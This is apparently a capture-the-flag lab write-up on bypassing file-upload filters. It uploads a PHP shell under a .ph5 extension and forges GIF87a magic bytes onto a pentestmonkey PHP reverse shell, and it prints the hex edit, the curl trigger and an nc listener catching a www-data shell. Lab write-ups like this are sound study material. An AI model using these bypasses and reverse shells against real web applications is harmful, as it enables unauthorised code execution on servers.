Upload Vulnerabilities: a GIF polyglot that got past a content filter

A file-upload filter checks more than its error message lets on. One extension-mangling trick gets caught immediately. A different approach, forging a GIF's magic bytes onto a working PHP shell, sails straight through.

Room: Upload Vulnerabilities Category: Web / File Upload Tools: gobuster, hexedit, curl

The setup: a series of small labs, each fronted by a different upload filter testing a different bypass technique. The job: work out what each filter actually checks, extension or content, and craft an upload that gets past it.

No flag appears in these notes, the two resolved filters are the interesting part. A third sub-lab's notes cut off mid-enumeration before reaching a conclusion, left out here rather than guessed at.

The Investigation

1
Try an alternate PHP extension, then a double extension

Scanning the box first: 22/tcp OpenSSH 7.6p1, 80/tcp nginx/1.17.6. The first filtered upload endpoint lives on a subdomain, reachable directly with curl:

curl -F "fileToUpload=@./nicodemus-linux" http://shell.uploadvulns.thm/

Gobuster maps the app first:

gobuster dir -u annex.uploadvulns.thm -w directory-list-2.3-medium.txt -t 200 -z

/privacy          (Status: 301) [Size: 332] [--> http://annex.uploadvulns.thm/privacy/]
/assets           (Status: 301) [Size: 331] [--> http://annex.uploadvulns.thm/assets/]
/server-status    (Status: 403) [Size: 286]

The filter blocks a plain .php upload, but accepts a renamed shell.ph5, and uploaded files land in /privacy. A double-extension attempt, revshell.png.pHp, uploads successfully but doesn't execute, confirmed by the browser's own error on fetching it:

The image "http://annex.uploadvulns.thm/privacy/2021-05-13-01-26-28-zrevshell.png.Phtml" cannot be displayed because it contains errors.
Why this works

This filter is checking the extension against a blocklist, not the file's actual content, so an extension the server still maps to its PHP handler (.ph5 here) sails through while a double extension that nginx doesn't treat as executable PHP just gets stored as an inert file, uploaded, but harmless.

2
Build a GIF/PHP polyglot to beat a content-based filter

A different subdomain runs a stricter filter that inspects file content, not just the name. Gobuster finds its upload directory:

gobuster dir -u magic.uploadvulns.thm -t 200 -w directory-list-2.3-medium.txt -z

/graphics    (Status: 301) [Size: 333] [--> http://magic.uploadvulns.thm/graphics/]
/assets      (Status: 301) [Size: 331] [--> http://magic.uploadvulns.thm/assets/]
/server-status (Status: 403) [Size: 286]

GIF files start with a fixed six-byte signature, GIF87a. Six placeholder bytes get added to the top of a pentestmonkey PHP reverse shell in a text editor to make room, then overwritten in a hex editor to match that exact signature:

# before, in Sublime:
AAAAAA<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

# after, in hexedit (first bytes changed to the GIF magic number):
00000000  47 49 46 38 37 61 3C 3F   GIF87a<?
00000008  70 68 70 0A 2F 2F 20 70   php.// p

Uploading it, the app confirms success:

Magic Numbers
File successfully uploaded
http://magic.uploadvulns.thm/?submit=success

Curling the uploaded file directly triggers it, no browser needed:

curl http://magic.uploadvulns.thm/graphics/yrevshell.php

Caught on a waiting listener:

nc -lvnp 53
Connection from 10.10.39.96:59890
Linux 94d79a333b8d 4.15.0-109-generic #110-Ubuntu SMP
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
Why this works

A file's "type" is whatever the first bytes say it is, to a filter that sniffs content instead of trusting the extension. Prepending the real GIF signature satisfies that check completely, while the server executing .php files by extension doesn't care what bytes come before the opening <?php tag. The filter and the execution engine are looking at two different things, and the polyglot satisfies both simultaneously.
